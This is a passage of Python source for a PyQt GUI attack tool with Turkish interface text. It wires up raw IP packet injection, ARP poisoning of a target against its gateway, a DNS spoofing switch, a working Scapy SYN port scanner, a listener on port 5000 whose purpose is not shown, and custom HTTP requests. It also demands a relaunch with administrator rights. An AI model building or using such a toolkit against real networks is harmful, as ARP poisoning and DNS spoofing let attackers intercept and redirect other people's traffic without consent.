            QTreeWidgetItem(tcp_item, ["Flags", str(tcp.flags)]); QTreeWidgetItem(tcp_item, ["Seq", str(tcp.seq)])
        elif UDP in raw:
            udp = raw[UDP]; QTreeWidgetItem(self.detail_tree, ["UDP", f"{udp.sport} -> {udp.dport}"])
        elif ICMP in raw:
            icmp = raw[ICMP]; QTreeWidgetItem(self.detail_tree, ["ICMP", f"Type: {icmp.type}"])

        if Raw in raw:
            payload = raw[Raw].load
            hex_str = binascii.hexlify(payload, ' ').decode().upper()
            ascii_str = "".join(chr(b) if 32 <= b < 127 else "." for b in payload)
            pl_item = QTreeWidgetItem(self.detail_tree, ["Data (Payload)", f"{len(payload)} bytes"])
            QTreeWidgetItem(pl_item, ["Hex", hex_str]); QTreeWidgetItem(pl_item, ["ASCII", ascii_str])
        
        self.detail_tree.expandAll()

    def start_ip_injection(self):
        if not is_admin(): return
        self.progress.setVisible(True); self.progress.setValue(0); self.progress.setMaximum(self.ip_count.value())
        params = {
            "mode": "IP", "src_ip": self.ip_src.text(), "dst_ip": self.ip_dst.text(),
            "proto": self.ip_proto.currentText(), "dst_port": self.ip_port.value(),
            "ttl": 64, "payload": self.ip_payload.text(), "is_hex": self.ip_is_hex.isChecked(),
            "random": self.ip_random.isChecked(), "count": self.ip_count.value(),
            "delay": self.ip_delay.value() / 1000.0, "iface": self.iface_combo.currentText(),
        }
        self.engine.start_injection(params)
        self.log("IP Enjeksiyonu baslatildi.", "warn")

    def start_arp_injection(self):
        if not is_admin(): return
        self.progress.setVisible(True); self.progress.setValue(0); self.progress.setMaximum(self.arp_count.value())
        iface = self.iface_combo.currentText(); my_mac = get_if_hwaddr(iface)
        params = {"mode": "ARP", "dst_ip": self.arp_target.text(), "src_ip": self.arp_gateway.text(), "my_mac": my_mac, "count": self.arp_count.value(), "delay": 0.5, "iface": iface}
        self.engine.start_injection(params)
        self.log("ARP Zehirleme baslatildi.", "warn")

    def toggle_dns_spoof(self):
        if not self.dns_spoof_active:
            self.dns_spoof_active = True
            self.btn_dns_toggle.setText("DNS Spoofing Durdur")
            self.btn_dns_toggle.setStyleSheet("background-color: #b71c1c; font-weight: bold; padding: 10px; color: white;")
            self.log("DNS Spoofing AKTIF. Dinlemeyi baslatin.", "success")
        else:
            self.dns_spoof_active = False
            self.btn_dns_toggle.setText("DNS Spoofing Baslat")
            self.btn_dns_toggle.setStyleSheet("background-color: #6a0080; font-weight: bold; padding: 10px; color: white;")
            self.log("DNS Spoofing DURDURULDU.", "warn")

    def start_port_scan(self):
        if not is_admin(): return
        target = self.scan_target.text(); ports_str = self.scan_ports.text(); ports = []
        try:
            for p in ports_str.split(","):
                if "-" in p:
                    start, end = map(int, p.split("-")); ports.extend(range(start, end+1))
                else: ports.append(int(p))
        except: self.log("Gecersiz port formati.", "error"); return
        self.progress.setVisible(True); self.progress.setValue(0); self.progress.setMaximum(len(ports)); self.log(f"Port taramasi baslatildi: {target}", "warn")
        def scan():
            for port in ports:
                pkt = IP(dst=target)/TCP(dport=port, flags="S"); resp = sr1(pkt, timeout=0.5, verbose=False)
                if resp and resp.haslayer(TCP):
                    if resp[TCP].flags == 0x12: self.log(f"[Scan] Port {port} ACIK (SYN-ACK alindi)", "success")
                self.sent_count += 1
                self.progress_sig.emit(self.sent_count, len(ports))
            self.log("Port taramasi bitti.", "success"); self.finished_sig.emit()
        threading.Thread(target=scan, daemon=True).start()

    def update_progress(self, sent, total):
        self.progress.setValue(sent); self.progress.setFormat(f"Islem: {sent}/{total}")

    def on_finished(self): self.progress.setVisible(False)
    def update_stats(self, sent, captured): self.lbl_stats.setText(f"Gonderilen: {sent} | Yakalanan: {captured}")

    def toggle_logger(self):
        if not self.logger.running:
            self.logger.start(host='0.0.0.0', port=5000)
            self.lbl_logger_status.setText("CALISIYOR (Port 5000)")
            self.lbl_logger_status.setStyleSheet("color: #5fb0e0; font-weight: bold;")
            self.btn_start_logger.setText("Logger Sunucusunu Durdur")
            self.btn_start_logger.setStyleSheet("background-color: #b71c1c; font-weight: bold; padding: 10px;")
        else:
            self.logger.stop()
            self.lbl_logger_status.setText("DURDURULDU")
            self.lbl_logger_status.setStyleSheet("color: #ff5252; font-weight: bold;")
            self.btn_start_logger.setText("Logger Sunucusunu Baslat (Port 5000)")
            self.btn_start_logger.setStyleSheet("background-color: #1b5e20; font-weight: bold; padding: 10px;")

    def send_http_request(self):
        url = self.http_url.text(); method = self.http_method.currentText(); body = self.http_body.text(); custom_header = self.http_header.text()
        headers = {}
        if custom_header:
            try:
                key, val = custom_header.split(":", 1); headers[key.strip()] = val.strip()
            except: self.log("Custom Header formati 'Key: Value' seklinde olmali.", "error"); return
        self.log(f"HTTP Istegi gonderiliyor: {method} {url}", "info")
        threading.Thread(target=self.engine.http_request, args=(url, method, headers, body), daemon=True).start()

def main():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    if not is_admin():
        reply = QMessageBox.question(None, "Yetki Gerekli", "Bu arac ag seviyesinde islem yapar.\nYonetici olarak yeniden baslatilsin mi?", QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if reply == QMessageBox.StandardButton.Yes:
            if relaunch_admin(): sys.exit(0)
            else: sys.exit(1)
        else: sys.exit(0)
    win = PySharkApp()
    win.show()
    sys.exit(app.exec())

if __name__ == "__main__":
    try: main()
    except Exception:
        traceback.print_exc(); input("Kapatmak icin Enter...")